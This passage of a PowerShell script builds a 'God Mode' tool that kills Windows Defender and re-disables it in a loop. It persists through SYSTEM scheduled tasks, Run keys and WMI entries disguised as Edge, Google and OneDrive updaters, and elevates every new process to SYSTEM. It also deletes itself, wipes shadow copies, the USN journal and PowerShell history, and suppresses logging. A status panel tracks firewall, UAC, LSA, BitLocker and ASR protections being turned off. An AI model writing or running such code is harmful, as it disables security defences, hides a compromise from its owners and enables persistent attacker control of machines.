        bcdedit /deletevalue {current} safeboot /f 2>$null | Out-Null
        bcdedit /set {current} bootstatuspolicy displayallfailures /f 2>$null | Out-Null
        bcdedit /set {current} recoveryenabled Yes /f 2>$null | Out-Null
        bcdedit /set {current} nx OptIn /f 2>$null | Out-Null
        cmd /c "reagentc.exe /enable" 2>$null | Out-Null
        Write-Log -Message "Safe Mode and Windows RE restored." -Type "INFO" -Color Gray
    } catch { Write-Log -Message "BCD restore failed: $_" -Type "WARN" -Color Yellow }

    # 9. Restore Security Center alerts
    try {
        Remove-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" -Name "HideSCAHealth" -ErrorAction SilentlyContinue
        Remove-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications" -Name "DisableNotifications" -ErrorAction SilentlyContinue
        Remove-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications" -Name "DisableEnhancedNotifications" -ErrorAction SilentlyContinue
    } catch {}

    # 10. Restore ELAM
    try {
        Remove-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\EarlyLaunch" -Name "DriverLoadPolicy" -ErrorAction SilentlyContinue
    } catch {}

    # 11. Restore event logging
    try {
        Set-Service -Name "EventLog" -StartupType Automatic -ErrorAction SilentlyContinue
        Start-Service -Name "EventLog" -ErrorAction SilentlyContinue
    } catch {}

    # 12. NEW: Restore UAC prompts
    try {
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "ConsentPromptBehaviorAdmin" -Value 5 -Force -ErrorAction SilentlyContinue
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "PromptOnSecureDesktop" -Value 1 -Force -ErrorAction SilentlyContinue
    } catch {}

    # 13. NEW: Restore SmartScreen
    try {
        Remove-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" -Name "SmartScreenEnabled" -ErrorAction SilentlyContinue
        Remove-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\System" -Name "EnableSmartScreen" -ErrorAction SilentlyContinue
        Remove-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\MicrosoftEdge\PhishingFilter" -Name "EnabledV9" -ErrorAction SilentlyContinue
    } catch {}

    # 14. NEW: Restore Remote UAC
    try {
        Remove-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "LocalAccountTokenFilterPolicy" -ErrorAction SilentlyContinue
    } catch {}

    # 15. NEW: Restore Credential Guard / VBS
    try {
        Remove-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard" -Name "EnableVirtualizationBasedSecurity" -ErrorAction SilentlyContinue
        Remove-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard" -Name "RequirePlatformSecurityFeatures" -ErrorAction SilentlyContinue
        Remove-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "LsaCfgFlags" -ErrorAction SilentlyContinue
    } catch {}

    # 16. NEW: Restore Windows Script Host
    try {
        Remove-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Script Host\Settings" -Name "Enabled" -ErrorAction SilentlyContinue
    } catch {}

    Write-Log -Message "Dangerous mode disable attempt complete. Reboot strongly recommended for full restoration." -Type "INFO" -Color Yellow
    Write-DebugLog -FunctionName "Disable-DangerousMode" -Action "EXIT" -Message "Complete"
}

function Register-StealthTask {
    $taskName = $GodModeTaskPrefix + (Get-Random -Minimum 10000 -Maximum 99999)
    Unregister-StealthTask

    $action = New-ScheduledTaskAction -Execute "powershell.exe" `
        -Argument "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`" -Launch"

    $trigger = New-ScheduledTaskTrigger -AtLogon
    $principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" `
        -LogonType ServiceAccount -RunLevel Highest

    Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger `
        -Principal $principal -Force | Out-Null
}

function Unregister-StealthTask {
    Get-ScheduledTask -TaskName "$GodModeTaskPrefix*" -ErrorAction SilentlyContinue |
        Unregister-ScheduledTask -Confirm:$false -ErrorAction SilentlyContinue
}

function Elevate-Process {
    param([string]$Path)
    if (-not (Test-Path $Path)) { return }

    Write-Log -Message "Elevating: $Path" -Type "STEALTH" -Color Gray

    try {
        $action = New-ScheduledTaskAction -Execute $Path
        $principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" `
            -LogonType ServiceAccount -RunLevel Highest
        $tempTask = "Elevate_" + (Get-Random -Minimum 1000 -Maximum 99999)

        Register-ScheduledTask -TaskName $tempTask -Action $action -Principal $principal -Force | Out-Null
        Start-ScheduledTask -TaskName $tempTask
        Start-Sleep -Milliseconds 400
        Unregister-ScheduledTask -TaskName $tempTask -Confirm:$false
    } catch {
        Write-Log -Message "Failed to elevate: $Path" -Type "ERROR" -Color Red
    }
}

function Start-Monitoring {
    Write-DebugLog -FunctionName "Start-Monitoring" -Action "ENTRY"
    $Flag = Get-ItemProperty -Path $GodModeFlagRegPath -Name $GodModeFlagRegName -ErrorAction SilentlyContinue
    if (-not ($Flag -and $Flag.$GodModeFlagRegName -eq 1)) {
        Write-Log -Message "God Mode is not enabled." -Type "ERROR" -Color Red
        Write-DebugLog -FunctionName "Start-Monitoring" -Action "EXIT" -Message "Aborted: flag registry missing"
        return
    }

    # Hide from simple Task Manager view
    Invoke-StealthMode

    Write-Log -Message "Monitoring started with auto-recovery and resurrection killer." -Type "INFO"

    $lastElevated = @{}   # Process path -> last elevated time
    $lastKillCheck = [datetime]::MinValue

    while ($true) {
        try {
            Start-Sleep -Seconds 2

            # --- Resurrection Killer: Re-kill security services if they respawn (every 30 seconds) ---
            if ((Get-Date) - $lastKillCheck -gt [TimeSpan]::FromSeconds(30)) {
                $lastKillCheck = Get-Date
                $ServicesToKill = @("MsMpEng", "MsMpEngCP", "MpDefenderCoreService", "MsSense", "smartscreen", "SecurityHealthService", "MpCmdRun")
                foreach ($procName in $ServicesToKill) {
                    try {
                        Get-Process -Name $procName -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
                    } catch { }
                }
                # Re-apply service-level disable if any service got re-enabled
                $DefenderServices = @("WinDefend", "WdNisSvc", "wscsvc", "SecurityHealthService", "Sense", "MDCoreSvc")
                foreach ($svc in $DefenderServices) {
                    try {
                        $svcObj = Get-Service -Name $svc -ErrorAction SilentlyContinue
                        if ($svcObj -and $svcObj.Status -eq 'Running') {
                            Stop-Service -Name $svc -Force -ErrorAction SilentlyContinue
                            Set-Service -Name $svc -StartupType Disabled -ErrorAction SilentlyContinue
                            Write-Log -Message "Resurrection killer: re-disabled $svc" -Type "INFO" -Color Gray
                        }
                    } catch { }
                }
            }

            # --- New Process Elevation ---
            $newProcesses = Get-WmiObject Win32_Process | Where-Object {
                $_.CreationDate -and 
                ([datetime]::ParseExact($_.CreationDate.Substring(0,14), "yyyyMMddHHmmss", $null)) -gt (Get-Date).AddSeconds(-10)
            }

            foreach ($proc in $newProcesses) {
                if ($proc.ExecutablePath -and $proc.ExecutablePath -like "*.exe") {
                    $path = $proc.ExecutablePath

                    # Stronger duplicate prevention (60-second cooldown)
                    if (-not $lastElevated.ContainsKey($path) -or 
                        $lastElevated[$path] -lt (Get-Date).AddSeconds(-60)) {

                        $lastElevated[$path] = Get-Date
                        Elevate-Process $path
                    }
                }
            }
        }
        catch {
            Write-DebugLog -FunctionName "Start-Monitoring" -Action "ERROR" -Message "Loop exception" -ErrorRecord $_
            Write-Log -Message "Monitoring error (recovering in 5s): $_" -Type "ERROR" -Color Red
            Start-Sleep -Seconds 5
        }
    }
}

function Enable-GodMode {
    Write-DebugLog -FunctionName "Enable-GodMode" -Action "ENTRY"
    if (-not (Test-Path $GodModeFlagRegPath)) { New-Item -Path $GodModeFlagRegPath -Force | Out-Null }
    Set-ItemProperty -Path $GodModeFlagRegPath -Name $GodModeFlagRegName -Value 1 -Force -ErrorAction SilentlyContinue
    Register-StealthTask
    Enable-DangerousMode

    # --- Registry Persistence (Run keys) ---
    Write-Log -Message "Setting registry persistence keys..." -Type "INFO" -Color Gray
    $ScriptCmd = "powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`" -ToggleOn"
    try {
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "MicrosoftEdgeUpdateCore" -Value $ScriptCmd -Force -ErrorAction SilentlyContinue
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce" -Name "MicrosoftEdgeUpdateCore" -Value $ScriptCmd -Force -ErrorAction SilentlyContinue
        Write-Log -Message "Registry persistence keys set." -Type "INFO" -Color Gray
    } catch { Write-Log -Message "Failed to set registry persistence: $_" -Type "WARN" -Color Yellow }

    # --- Multi-layer task redundancy (backup task names) ---
    Write-Log -Message "Registering backup persistence tasks..." -Type "INFO" -Color Gray
    $BackupPrefixes = @("GoogleUpdateTask_", "ChromeUpdater_", "OneDriveSyncTask_")
    foreach ($Prefix in $BackupPrefixes) {
        try {
            $taskName = $Prefix + (Get-Random -Minimum 10000 -Maximum 99999)
            $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`" -ToggleOn"
            $trigger = New-ScheduledTaskTrigger -AtLogon
            $principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount -RunLevel Highest
            Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Force | Out-Null
            Write-Log -Message "Backup task $taskName registered." -Type "INFO" -Color Gray
        } catch { Write-Log -Message "Backup task $Prefix failed: $_" -Type "WARN" -Color Yellow }
    }

    # --- Self-protection: harden flag registry key ---
    try {
        if (Test-Path $GodModeFlagRegPath) {
            $RegKey = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\WpnPlatform\Settings", [Microsoft.Win32.RegistryKeyPermissionCheck]::ReadWriteSubTree, [System.Security.AccessControl.RegistryRights]::ChangePermissions)
            if ($RegKey) {
                $Acl = $RegKey.GetAccessControl()
                $Acl.SetAccessRuleProtection($true, $false)
                $Acl.Access | ForEach-Object { $Acl.RemoveAccessRule($_) | Out-Null }
                $Acl.AddAccessRule((New-Object System.Security.AccessControl.RegistryAccessRule($SidSystem, "FullControl", "ContainerInherit,ObjectInherit", "None", "Allow")))
                $Acl.AddAccessRule((New-Object System.Security.AccessControl.RegistryAccessRule($SidAdmin, "ReadKey", "ContainerInherit,ObjectInherit", "None", "Allow")))
                $Acl.AddAccessRule((New-Object System.Security.AccessControl.RegistryAccessRule($SidUsers, "ReadKey", "ContainerInherit,ObjectInherit", "None", "Deny")))
                $RegKey.SetAccessControl($Acl)
                $RegKey.Close()
            }
        }
    } catch { Write-Log -Message "Flag registry self-protection failed: $_" -Type "WARN" -Color Yellow }

    # --- WMI persistence (file-less fallback) ---
    Register-GodModeWMI

    # --- Self-destruct: delete original script from disk after persistence is set ---
    Invoke-SelfDestruct -Path $PSCommandPath

    # --- Anti-forensics: clear traces ---
    Write-Log -Message "Running anti-forensics cleanup..." -Type "INFO" -Color Gray
    Clear-ShadowCopies
    Clear-USNJournal
    Clear-CrashDumps
    Clear-PowerShellHistory
    Clear-RecentTraces

    # --- Deep persistence: harder to remove ---
    Register-DeepPersistence

    # --- Stealth mode: harder to detect ---
    Invoke-StealthMode

    Write-Log -Message "God Mode ENABLED" -Type "WARN" -Color Yellow
    Write-DebugLog -FunctionName "Enable-GodMode" -Action "EXIT" -Message "Success"
}

function Disable-GodMode {
    Write-DebugLog -FunctionName "Disable-GodMode" -Action "ENTRY"
    Remove-ItemProperty -Path $GodModeFlagRegPath -Name $GodModeFlagRegName -ErrorAction SilentlyContinue
    Unregister-StealthTask

    # --- Remove backup task prefixes ---
    $BackupPrefixes = @("GoogleUpdateTask_", "ChromeUpdater_", "OneDriveSyncTask_", $GodModeTaskPrefix)
    foreach ($Prefix in $BackupPrefixes) {
        try {
            Get-ScheduledTask -TaskName "$Prefix*" -ErrorAction SilentlyContinue |
                Unregister-ScheduledTask -Confirm:$false -ErrorAction SilentlyContinue
        } catch { }
    }

    # --- Remove registry persistence ---
    try {
        Remove-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "MicrosoftEdgeUpdateCore" -ErrorAction SilentlyContinue
        Remove-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce" -Name "MicrosoftEdgeUpdateCore" -ErrorAction SilentlyContinue
    } catch { Write-Log -Message "Failed to remove registry persistence: $_" -Type "WARN" -Color Yellow }

    Disable-DangerousMode

    # --- Cleanup WMI persistence ---
    try {
        $WmiName = "Win32ProviderHealthCheck"
        Get-WmiObject -Class __EventFilter -Namespace "root\subscription" -Filter "Name='$WmiName'" -ErrorAction SilentlyContinue | Remove-WmiObject -ErrorAction SilentlyContinue
        Get-WmiObject -Class CommandLineEventConsumer -Namespace "root\subscription" -Filter "Name='$WmiName'" -ErrorAction SilentlyContinue | Remove-WmiObject -ErrorAction SilentlyContinue
        Get-WmiObject -Class __FilterToConsumerBinding -Namespace "root\subscription" -Filter "__PATH LIKE '%$WmiName%'" -ErrorAction SilentlyContinue | Remove-WmiObject -ErrorAction SilentlyContinue
        Write-Log -Message "WMI persistence removed." -Type "INFO" -Color Gray
    } catch { Write-Log -Message "WMI cleanup failed: $_" -Type "WARN" -Color Yellow }

    Write-Log -Message "God Mode DISABLED" -Type "WARN" -Color Yellow
    Write-DebugLog -FunctionName "Disable-GodMode" -Action "EXIT" -Message "Success"
}

function Show-GodModeStatus {
    Write-Host "`n=====================================================" -ForegroundColor DarkGray
    Write-Host " GOD MODE STATUS DETAIL                    " -ForegroundColor White
    Write-Host "=====================================================" -ForegroundColor DarkGray

    # Current user identity
    $CurrentUser = [Security.Principal.WindowsIdentity]::GetCurrent()
    $IsAdmin = ([Security.Principal.WindowsPrincipal]$CurrentUser).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
    $IsBuiltIn = ($CurrentUser.User.Value -like "*-500")
    Write-Host "  Current User            : $($CurrentUser.Name)" -ForegroundColor White
    Write-Host "  User SID                : $($CurrentUser.User.Value)" -ForegroundColor White
    if ($IsBuiltIn) {
        Write-Host "  Built-in Administrator  : YES" -ForegroundColor Red
    } else {
        Write-Host "  Built-in Administrator  : NO" -ForegroundColor Yellow
    }
    if ($IsAdmin) {
        Write-Host "  Admin Privileges        : YES" -ForegroundColor Yellow
    } else {
        Write-Host "  Admin Privileges        : NO" -ForegroundColor Red
    }
    Write-Host "-----------------------------------------------------" -ForegroundColor DarkGray

    # Core God Mode state
    $Flag = Get-ItemProperty -Path $GodModeFlagRegPath -Name $GodModeFlagRegName -ErrorAction SilentlyContinue
    if ($Flag -and $Flag.$GodModeFlagRegName -eq 1) {
        Write-Host "  God Mode State          : ACTIVE" -ForegroundColor Red
    } else {
        Write-Host "  God Mode State          : INACTIVE" -ForegroundColor Green
    }

    # Stealth task status
    $StealthTasks = Get-ScheduledTask -TaskName "$GodModeTaskPrefix*" -ErrorAction SilentlyContinue
    if ($StealthTasks) {
        Write-Host "  Stealth Task            : INSTALLED ($($StealthTasks.Count) found)" -ForegroundColor Cyan
    } else {
        Write-Host "  Stealth Task            : NOT INSTALLED" -ForegroundColor DarkGray
    }

    # Defender processes
    $DefenderProcs = @("MsMpEng", "MsMpEngCP", "MpDefenderCoreService", "MsSense", "smartscreen", "SecurityHealthService")
    $RunningDefender = 0
    foreach ($proc in $DefenderProcs) {
        if (Get-Process -Name $proc -ErrorAction SilentlyContinue) { $RunningDefender++ }
    }
    if ($RunningDefender -eq 0) {
        Write-Host "  Defender Processes      : ALL STOPPED ($RunningDefender/$($DefenderProcs.Count))" -ForegroundColor Green
    } else {
        Write-Host "  Defender Processes      : $RunningDefender RUNNING ($($DefenderProcs.Count) total)" -ForegroundColor Red
    }

    # Defender services
    $DefenderSvcs = @("WinDefend", "WdNisSvc", "wscsvc", "SecurityHealthService", "Sense", "MDCoreSvc")
    $RunningSvcs = 0
    foreach ($svc in $DefenderSvcs) {
        $svcObj = Get-Service -Name $svc -ErrorAction SilentlyContinue
        if ($svcObj -and $svcObj.Status -eq 'Running') { $RunningSvcs++ }
    }
    if ($RunningSvcs -eq 0) {
        Write-Host "  Defender Services       : ALL STOPPED ($RunningSvcs/$($DefenderSvcs.Count))" -ForegroundColor Green
    } else {
        Write-Host "  Defender Services       : $RunningSvcs RUNNING ($($DefenderSvcs.Count) total)" -ForegroundColor Red
    }

    # Real-time monitoring
    try {
        $MpPref = Get-MpPreference -ErrorAction SilentlyContinue
        if ($MpPref -and $MpPref.DisableRealtimeMonitoring) {
            Write-Host "  Real-Time Monitoring    : DISABLED" -ForegroundColor Green
        } else {
            Write-Host "  Real-Time Monitoring    : ENABLED (or indeterminate)" -ForegroundColor Red
        }
    } catch {
        Write-Host "  Real-Time Monitoring    : UNKNOWN (Get-MpPreference failed)" -ForegroundColor DarkGray
    }

    # Firewall
    $FirewallProfiles = Get-NetFirewallProfile -ErrorAction SilentlyContinue
    $FwEnabled = 0
    foreach ($fp in $FirewallProfiles) {
        if ($fp.Enabled) { $FwEnabled++ }
    }
    if ($FwEnabled -eq 0) {
        Write-Host "  Windows Firewall        : ALL PROFILES OFF" -ForegroundColor Green
    } else {
        Write-Host "  Windows Firewall        : $FwEnabled/$(($FirewallProfiles | Measure-Object).Count) PROFILES ON" -ForegroundColor Red
    }

    # UAC / LUA
    try {
        $lua = Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "EnableLUA" -ErrorAction SilentlyContinue
        if ($lua -and $lua.EnableLUA -eq 0) {
            Write-Host "  UAC (LUA)               : DISABLED" -ForegroundColor Green
        } else {
            Write-Host "  UAC (LUA)               : ENABLED" -ForegroundColor Red
        }
    } catch {
        Write-Host "  UAC (LUA)               : UNKNOWN" -ForegroundColor DarkGray
    }

    # Windows Update
    try {
        $wu = Get-Service -Name "wuauserv" -ErrorAction SilentlyContinue
        if ($wu -and $wu.Status -eq 'Running') {
            Write-Host "  Windows Update Service  : RUNNING" -ForegroundColor Red
        } else {
            Write-Host "  Windows Update Service  : STOPPED" -ForegroundColor Green
        }
    } catch {
        Write-Host "  Windows Update Service  : UNKNOWN" -ForegroundColor DarkGray
    }

    # WMI Persistence
    try {
        $WmiFilter = Get-WmiObject -Class __EventFilter -Namespace "root\subscription" -Filter "Name='Win32ProviderHealthCheck'" -ErrorAction SilentlyContinue
        if ($WmiFilter) {
            Write-Host "  WMI Persistence         : ACTIVE (file-less fallback)" -ForegroundColor Red
        } else {
            Write-Host "  WMI Persistence         : NOT ACTIVE" -ForegroundColor Green
        }
    } catch {
        Write-Host "  WMI Persistence         : UNKNOWN" -ForegroundColor DarkGray
    }

    # Safe Mode / Recovery
    try {
        $BcdOutput = bcdedit /enum {current} 2>$null | Out-String
        $SafeModeBlocked = ($BcdOutput -match "safeboot\s+minimal")
        $ReBlocked = ($BcdOutput -match "recoveryenabled\s+No")
        if ($SafeModeBlocked -and $ReBlocked) {
            Write-Host "  Safe Mode / Recovery    : BLOCKED (BCD hardened)" -ForegroundColor Red
        } elseif ($SafeModeBlocked -or $ReBlocked) {
            Write-Host "  Safe Mode / Recovery    : PARTIALLY BLOCKED" -ForegroundColor Yellow
        } else {
            Write-Host "  Safe Mode / Recovery    : AVAILABLE" -ForegroundColor Green
        }
    } catch {
        Write-Host "  Safe Mode / Recovery    : UNKNOWN" -ForegroundColor DarkGray
    }

    # ELAM
    try {
        $Elam = Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\EarlyLaunch" -Name "DriverLoadPolicy" -ErrorAction SilentlyContinue
        if ($Elam -and $Elam.DriverLoadPolicy -eq 3) {
            Write-Host "  ELAM Boot Drivers       : UNKNOWN ALLOWED" -ForegroundColor Red
        } else {
            Write-Host "  ELAM Boot Drivers       : ENFORCED" -ForegroundColor Green
        }
    } catch {
        Write-Host "  ELAM Boot Drivers       : UNKNOWN" -ForegroundColor DarkGray
    }

    # Security Center Alerts
    try {
        $ScAlert = Get-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications" -Name "DisableNotifications" -ErrorAction SilentlyContinue
        if ($ScAlert -and $ScAlert.DisableNotifications -eq 1) {
            Write-Host "  Security Center Alerts  : SUPPRESSED" -ForegroundColor Red
        } else {
            Write-Host "  Security Center Alerts  : ACTIVE" -ForegroundColor Green
        }
    } catch {
        Write-Host "  Security Center Alerts  : UNKNOWN" -ForegroundColor DarkGray
    }

    # Event Logging
    try {
        $EvtSvc = Get-Service -Name "EventLog" -ErrorAction SilentlyContinue
        if ($EvtSvc -and $EvtSvc.Status -eq 'Running') {
            Write-Host "  Event Logging           : RUNNING" -ForegroundColor Green
        } else {
            Write-Host "  Event Logging           : STOPPED / CLEARED" -ForegroundColor Red
        }
    } catch {
        Write-Host "  Event Logging           : UNKNOWN" -ForegroundColor DarkGray
    }

    # UAC Prompts
    try {
        $UacPrompt = Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "ConsentPromptBehaviorAdmin" -ErrorAction SilentlyContinue
        if ($UacPrompt -and $UacPrompt.ConsentPromptBehaviorAdmin -eq 0) {
            Write-Host "  UAC Prompts             : SILENT (No Elevation Prompt)" -ForegroundColor Red
        } else {
            Write-Host "  UAC Prompts             : PROMPTING" -ForegroundColor Green
        }
    } catch {
        Write-Host "  UAC Prompts             : UNKNOWN" -ForegroundColor DarkGray
    }

    # SmartScreen
    try {
        $SsReg = Get-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\System" -Name "EnableSmartScreen" -ErrorAction SilentlyContinue
        if ($SsReg -and $SsReg.EnableSmartScreen -eq 0) {
            Write-Host "  SmartScreen             : DISABLED (Registry)" -ForegroundColor Red
        } else {
            Write-Host "  SmartScreen             : ENABLED" -ForegroundColor Green
        }
    } catch {
        Write-Host "  SmartScreen             : UNKNOWN" -ForegroundColor DarkGray
    }

    # Remote UAC
    try {
        $Ruac = Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "LocalAccountTokenFilterPolicy" -ErrorAction SilentlyContinue
        if ($Ruac -and $Ruac.LocalAccountTokenFilterPolicy -eq 1) {
            Write-Host "  Remote UAC              : DISABLED (Full Admin Tokens)" -ForegroundColor Red
        } else {
            Write-Host "  Remote UAC              : ENABLED (Filtered)" -ForegroundColor Green
        }
    } catch {
        Write-Host "  Remote UAC              : UNKNOWN" -ForegroundColor DarkGray
    }

    # Credential Guard / VBS
    try {
        $Vbs = Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard" -Name "EnableVirtualizationBasedSecurity" -ErrorAction SilentlyContinue
        if ($Vbs -and $Vbs.EnableVirtualizationBasedSecurity -eq 0) {
            Write-Host "  Credential Guard / VBS  : DISABLED" -ForegroundColor Red
        } else {
            Write-Host "  Credential Guard / VBS  : ENABLED" -ForegroundColor Green
        }
    } catch {
        Write-Host "  Credential Guard / VBS  : UNKNOWN" -ForegroundColor DarkGray
    }

    # Windows Script Host
    try {
        $Wsh = Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Script Host\Settings" -Name "Enabled" -ErrorAction SilentlyContinue
        if ($Wsh -and $Wsh.Enabled -eq 0) {
            Write-Host "  Windows Script Host     : DISABLED" -ForegroundColor Red
        } else {
            Write-Host "  Windows Script Host     : ENABLED" -ForegroundColor Green
        }
    } catch {
        Write-Host "  Windows Script Host     : UNKNOWN" -ForegroundColor DarkGray
    }

    # Defender Exclusions
    try {
        $Exclusions = Get-MpPreference -ErrorAction SilentlyContinue | Select-Object -ExpandProperty ExclusionPath -ErrorAction SilentlyContinue
        if ($Exclusions -and ($Exclusions -contains $GodModeInstallDir -or $Exclusions -contains $PSCommandPath)) {
            Write-Host "  Defender Exclusions     : SELF-WHITELISTED" -ForegroundColor Red
        } else {
            Write-Host "  Defender Exclusions     : NOT WHITELISTED" -ForegroundColor Green
        }
    } catch {
        Write-Host "  Defender Exclusions     : UNKNOWN" -ForegroundColor DarkGray
    }

    # File-less / Self-Destruct
    try {
        if (Test-Path $PSCommandPath) {
            Write-Host "  Original Payload        : ON DISK" -ForegroundColor Green
        } else {
            Write-Host "  Original Payload        : SELF-DESTRUCTED (file-less)" -ForegroundColor Red
        }
    } catch {
        Write-Host "  Original Payload        : UNKNOWN" -ForegroundColor DarkGray
    }

    # Stealth Mode
    try {
        $Sbl = Get-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -ErrorAction SilentlyContinue
        $Trans = Get-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription" -Name "EnableTranscripting" -ErrorAction SilentlyContinue
        $ModLog = Get-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging" -Name "EnableModuleLogging" -ErrorAction SilentlyContinue
        if (($Sbl -and $Sbl.EnableScriptBlockLogging -eq 0) -and ($Trans -and $Trans.EnableTranscripting -eq 0) -and ($ModLog -and $ModLog.EnableModuleLogging -eq 0)) {
            Write-Host "  Stealth Mode            : ACTIVE (Logging suppressed)" -ForegroundColor Green
        } else {
            Write-Host "  Stealth Mode            : INACTIVE" -ForegroundColor Red
        }
    } catch {
        Write-Host "  Stealth Mode            : UNKNOWN" -ForegroundColor DarkGray
    }

    # Deep Persistence
    try {
        $DeepReg1 = Get-ItemProperty -Path "HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsSecurityHealth" -ErrorAction SilentlyContinue
        $DeepReg2 = Get-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsSecurityHealth" -ErrorAction SilentlyContinue
        $DeepTaskCount = 0
        foreach ($Prefix in @("WindowsDefenderSigUpdates_*", "OneDriveStandaloneUpdater_*", "EdgeWebView2Updater_*")) {
            $DeepTaskCount += (Get-ScheduledTask -TaskName $Prefix -ErrorAction SilentlyContinue | Measure-Object).Count
        }
        $DeepWmi = Get-WmiObject -Class __EventFilter -Namespace "root\subscription" -Filter "Name='Win32BootHealthCheck'" -ErrorAction SilentlyContinue
        if ($DeepReg1 -or $DeepReg2 -or $DeepTaskCount -gt 0 -or $DeepWmi) {
            Write-Host "  Deep Persistence        : ACTIVE ($DeepTaskCount tasks, WMI:$([bool]$DeepWmi))" -ForegroundColor Green
        } else {
            Write-Host "  Deep Persistence        : NOT ACTIVE" -ForegroundColor Red
        }
    } catch {
        Write-Host "  Deep Persistence        : UNKNOWN" -ForegroundColor DarkGray
    }

    # Broader Security Subsystems
    # AppLocker
    try {
        $AppL = Get-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\SrpV2" -Name "EnforcementMode" -ErrorAction SilentlyContinue
        if ($AppL -and $AppL.EnforcementMode -eq 0) {
            Write-Host "  AppLocker               : DISABLED" -ForegroundColor Green
        } else {
            Write-Host "  AppLocker               : ENFORCED" -ForegroundColor Red
        }
    } catch { Write-Host "  AppLocker               : UNKNOWN" -ForegroundColor DarkGray }

    # Windows Sandbox / HVCI
    try {
        $Hvci = Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\HypervisorEnforcedCodeIntegrity" -Name "Enabled" -ErrorAction SilentlyContinue
        if ($Hvci -and $Hvci.Enabled -eq 0) {
            Write-Host "  Windows Sandbox / HVCI  : DISABLED" -ForegroundColor Green
        } else {
            Write-Host "  Windows Sandbox / HVCI  : ENABLED" -ForegroundColor Red
        }
    } catch { Write-Host "  Windows Sandbox / HVCI  : UNKNOWN" -ForegroundColor DarkGray }

    # LSA Protection
    try {
        $LsaPPL = Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "RunAsPPL" -ErrorAction SilentlyContinue
        if ($LsaPPL -and $LsaPPL.RunAsPPL -eq 0) {
            Write-Host "  LSA Protection          : DISABLED" -ForegroundColor Green
        } else {
            Write-Host "  LSA Protection          : ENABLED" -ForegroundColor Red
        }
    } catch { Write-Host "  LSA Protection          : UNKNOWN" -ForegroundColor DarkGray }

    # BitLocker
    try {
        $BlOn = Get-BitLockerVolume -ErrorAction SilentlyContinue | Where-Object { $_.ProtectionStatus -eq 'On' }
        if ($BlOn) {
            Write-Host "  BitLocker               : PROTECTED (On)" -ForegroundColor Red
        } else {
            Write-Host "  BitLocker               : SUSPENDED / OFF" -ForegroundColor Green
        }
    } catch { Write-Host "  BitLocker               : UNKNOWN" -ForegroundColor DarkGray }

    # ASR
    try {
        $Asr = Get-MpPreference -ErrorAction SilentlyContinue
        if ($Asr -and ($Asr.AttackSurfaceReductionRules_Actions -eq $null -or $Asr.AttackSurfaceReductionRules_Actions.Count -eq 0)) {
            Write-Host "  ASR Rules               : DISABLED" -ForegroundColor Green
        } else {
            Write-Host "  ASR Rules               : ENABLED" -ForegroundColor Red
        }
